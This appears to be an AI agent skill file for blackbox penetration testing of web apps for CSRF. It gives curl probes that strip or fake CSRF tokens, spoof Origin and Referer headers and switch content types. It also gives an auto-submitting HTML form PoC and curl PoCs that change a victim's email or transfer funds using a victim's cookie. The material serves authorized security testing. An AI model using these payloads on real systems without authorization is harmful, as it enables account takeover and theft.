---
name: blackbox-csrf
description: >-
  Actively test a target web application for Cross-Site Request Forgery (CSRF)
  vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  identifies state-changing endpoints (POST/PUT/DELETE), checks for CSRF token
  presence and validation, tests SameSite cookie attribute weaknesses, probes
  for origin/referer header bypass, and verifies whether cross-origin requests
  succeed. Writes confirmed findings with PoC HTML forms to
  pentest/csrf-results.md. Use when asked to find CSRF in a blackbox pentest.
---

# Blackbox CSRF Detection

You are actively testing a web application for Cross-Site Request Forgery vulnerabilities without source code access. You will identify state-changing endpoints and determine whether cross-origin requests are accepted without proper token validation.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## What You Are Looking For

CSRF allows an attacker to trick an authenticated victim into sending unintended requests. CSRF is exploitable when:
1. The state-changing action uses cookies for authentication (not headers like `Authorization: Bearer`)
2. There is no CSRF token, or the token is not validated server-side
3. The `SameSite` cookie attribute is `None` or absent (older default)
4. `Origin`/`Referer` headers are not checked, or can be spoofed/omitted

---

## Phase 1: Identify CSRF Candidates

Read `pentest/target-map.md` and list all **state-changing** endpoints:
- POST, PUT, PATCH, DELETE requests
- Actions: change email, change password, transfer funds, create/delete resources, update settings, logout

Focus on endpoints that use **session cookies** for auth (not Bearer tokens — those are not CSRF-vulnerable by default since JS must set them explicitly).

Write candidates to `pentest/csrf-recon.md`.

---

## Phase 2: Baseline Request Analysis

### Step 1: Make an Authenticated Request and Inspect It

Login and perform a state-changing action normally, capturing the full request:

```bash
# Login and capture session cookie
COOKIE=$(curl -sk -X POST "<TARGET_URL>/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}' \
  -c /tmp/cookies.txt -D - | grep -i set-cookie)

# Perform a state-changing action using the cookie
curl -sk -X POST "<TARGET_URL>/account/email" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"email":"newemail@test.com"}' \
  -D -
```

Check the request for:
- Is a CSRF token present in the body or headers? (`csrf_token`, `_token`, `X-CSRF-Token`, `X-XSRF-TOKEN`)
- Is the `SameSite` attribute on the session cookie? (`Strict`, `Lax`, or `None`)
- Does the server check `Origin` or `Referer` headers?

---

## Phase 3: CSRF Token Validation Testing

### Test 1: Remove the CSRF Token

If a CSRF token was observed in the request, remove it and see if the request still works:

```bash
# Original request had: csrf_token=abc123
# Replay without it:
curl -sk -X POST "<TARGET_URL>/account/email" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"email":"nocsrf@test.com"}' \
  -D -
```

**Confirmed CSRF-vulnerable** if the action succeeds (HTTP 200/302) without the token.

### Test 2: Use an Invalid CSRF Token

```bash
curl -sk -X POST "<TARGET_URL>/account/email" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"email":"nocsrf@test.com","csrf_token":"INVALID_TOKEN_12345"}' \
  -D -
```

**Vulnerable** if it succeeds with an invalid token (server not validating).

### Test 3: Use Another User's CSRF Token (Token Substitution)

If you have two accounts, get User B's CSRF token and use it on User A's session:

```bash
# Get User B's CSRF token from their session
CSRF_B=$(curl -sk "<TARGET_URL>/account" -b /tmp/cookies_b.txt | \
  grep -o 'csrf[^"]*"[^"]*"' | head -1)

# Use it with User A's session
curl -sk -X POST "<TARGET_URL>/account/email" \
  -b /tmp/cookies_a.txt \
  -d "email=test@test.com&csrf_token=$CSRF_B" \
  -D -
```

**Vulnerable** if accepted — server is not binding the token to the session.

---

## Phase 4: Header-Based Protection Testing

### Test 1: No Origin Header (Omitted)

```bash
# Some servers only check if Origin is present — remove it entirely
curl -sk -X POST "<TARGET_URL>/api/transfer" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/json" \
  --header "Origin:" \
  -d '{"to":"attacker","amount":100}' \
  -D -
```

### Test 2: Null Origin

```bash
curl -sk -X POST "<TARGET_URL>/api/transfer" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/json" \
  -H "Origin: null" \
  -d '{"to":"attacker","amount":100}' \
  -D -
```

**`null` origin** can be sent from sandboxed iframes — if accepted, CSRF is possible from any origin via iframe sandbox.

### Test 3: Subdomain Origin

```bash
# If target is target.com, try attacker.target.com
curl -sk -X POST "<TARGET_URL>/api/settings" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/json" \
  -H "Origin: https://attacker.target.com" \
  -d '{"setting":"value"}' \
  -D -
```

**Vulnerable** if the server has a regex like `*.target.com` that can be bypassed with a subdomain the attacker controls.

### Test 4: Cross-Origin POST via Form (no preflight)

Simple form POST with `application/x-www-form-urlencoded` does not trigger CORS preflight:

```bash
# Simulate cross-origin form POST (no preflight)
curl -sk -X POST "<TARGET_URL>/account/delete" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: https://attacker.com" \
  -H "Referer: https://attacker.com/csrf.html" \
  -d "confirm=true" \
  -D -
```

---

## Phase 5: SameSite Cookie Analysis

Check the session cookie flags from the login response:

```bash
curl -sk -D - -X POST "<TARGET_URL>/login" \
  -d "username=test&password=test" | grep -i "set-cookie"
```

**Cookie analysis**:
- `SameSite=Strict` → CSRF not possible (cookie not sent cross-site at all)
- `SameSite=Lax` → Top-level navigation GETs work cross-site; POST CSRF blocked in modern browsers. But subresource GET requests on authenticated endpoints may still be exploitable.
- `SameSite=None` → Cookie sent in ALL cross-site requests → CSRF fully possible (needs `Secure` flag)
- **No SameSite** → Browser default (varies: Chrome 80+ defaults to `Lax`)

For SameSite=Lax sites, test if any critical GET requests change state:
```bash
# GET-based state changes (e.g. email verification, account actions via GET)
curl -sk "<TARGET_URL>/account/confirm?token=abc" \
  -H "Referer: https://attacker.com"
```

---

## Phase 6: JSON CSRF

Some modern apps use `Content-Type: application/json` — browsers can't send cross-origin JSON POSTs without CORS preflight. Test if the endpoint also accepts other content types:

```bash
# Try sending JSON data as form-encoded
curl -sk -X POST "<TARGET_URL>/api/settings" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"setting":"evil"}' \
  -D -

# Try text/plain (no preflight triggered)
curl -sk -X POST "<TARGET_URL>/api/settings" \
  -b /tmp/cookies.txt \
  -H "Content-Type: text/plain" \
  -d '{"setting":"evil"}' \
  -D -
```

**Vulnerable** if the endpoint accepts the non-JSON Content-Type and processes the request.

---

## Output Format

Write findings to `pentest/csrf-results.md`:

```markdown
# CSRF Assessment Results

## Executive Summary
- Endpoints tested: [N]
- Confirmed CSRF: [N]
- Protected (CSRF tokens): [N]
- Protected (SameSite=Strict/Lax): [N]

## Findings

### [CONFIRMED CSRF] POST /account/email — No CSRF Token

- **Endpoint**: `POST /account/email`
- **Attack Scenario**: Attacker hosts malicious page; victim (logged in) visits → email silently changed
- **Impact**: Account takeover vector — attacker changes victim's email then triggers password reset
- **Missing Protection**: No CSRF token; SameSite=None on session cookie
- **PoC HTML** (host on attacker.com, victim must be logged in):
  ```html
  <html>
  <body onload="document.getElementById('f').submit()">
  <form id="f" action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  </body>
  </html>
  ```
- **PoC curl** (simulating cross-origin request):
  ```bash
  curl -sk -X POST "https://target.com/account/email" \
    -b "session=<VICTIM_COOKIE>" \
    -H "Origin: https://attacker.com" \
    -H "Referer: https://attacker.com/" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=attacker@evil.com"
  # Expected: HTTP 200 — email changed without victim's knowledge
  ```
- **Remediation**: Implement CSRF tokens (synchronizer token pattern or double-submit cookie). Set `SameSite=Lax` or `Strict` on session cookies. Validate `Origin`/`Referer` headers server-side.

### [CONFIRMED CSRF] POST /api/transfer — Token Not Validated Server-Side

- **Evidence**: Sending `csrf_token=INVALID_TOKEN_XYZ` returns HTTP 200 and processes the transfer
- **Impact**: Critical — funds can be transferred without victim's knowledge
- **PoC**:
  ```bash
  curl -sk -X POST "https://target.com/api/transfer" \
    -b "session=<VICTIM_COOKIE>" \
    -H "Content-Type: application/json" \
    -H "Origin: https://attacker.com" \
    -d '{"to_account":"attacker_id","amount":1000,"csrf_token":"FAKETOKEN"}'
  # Expected: HTTP 200 with successful transfer
  ```
- **Remediation**: Validate CSRF tokens on the server side for every state-changing request. Reject requests with invalid or missing tokens.
```

After writing results, delete `pentest/csrf-recon.md`.

---

## Important Reminders

- CSRF only applies to cookie-authenticated endpoints — JWT Bearer token endpoints are NOT CSRF-vulnerable (JS must explicitly set the header, and cross-origin JS is blocked by CORS).
- SameSite=Lax blocks POST CSRF in modern browsers BUT does NOT prevent GET-based state changes.
- The `null` origin bypass via sandboxed iframes is real — always test it.
- Always provide an HTML PoC for CSRF — it's the most convincing demonstration.
- Clean up: delete `pentest/csrf-recon.md` after writing results.
